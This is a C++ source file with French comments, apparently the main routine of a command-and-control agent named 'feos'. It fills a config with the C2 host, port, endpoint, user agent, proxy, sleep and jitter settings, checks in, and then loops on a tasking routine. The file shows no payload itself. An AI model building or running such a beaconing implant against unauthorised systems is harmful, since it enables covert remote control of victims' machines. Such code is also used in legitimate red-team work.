// feos.cpp : Ce fichier contient la fonction 'main'. L'exécution du programme commence et se termine à cet endroit.
//

#include "feos.h"
#include "Config.h"

CONFIG_FEOS* feosConfig = nullptr;

VOID feosMain()
{
    feosConfig = (CONFIG_FEOS*)LocalAlloc(LPTR, sizeof(CONFIG_FEOS));
    // Config Init
    feosConfig->agentID = (PCHAR)initUUID;
    feosConfig->hostName = (PWCHAR)hostname;
    feosConfig->httpPort = port;
    feosConfig->endPoint = (PWCHAR)endpoint;
    feosConfig->userAgent = (PWCHAR)useragent;
    feosConfig->httpMethod = (PWCHAR)httpmethod;
    feosConfig->isSSL = ssl;
    feosConfig->isProxyEnabled = proxyenabled;
    feosConfig->proxyURL = (PWCHAR)proxyurl;

    // Convert the sleeptime from seconds to miliseconds
    feosConfig->sleeptime_ms = 1000 * sleep_time;
    feosConfig->jitter = jitter_perc;

    feosConfig->numTasks = num_tasks;

    PParser ResponseParser = checkin();
    parseCheckin(ResponseParser);
    while (TRUE)
        routine();
}

VOID freeFeosConfig()
{
    if (feosConfig)
        LocalFree(feosConfig);
    return;
}

VOID setUUID(PCHAR newUUID)
{
    feosConfig->agentID = newUUID;
    return;
}

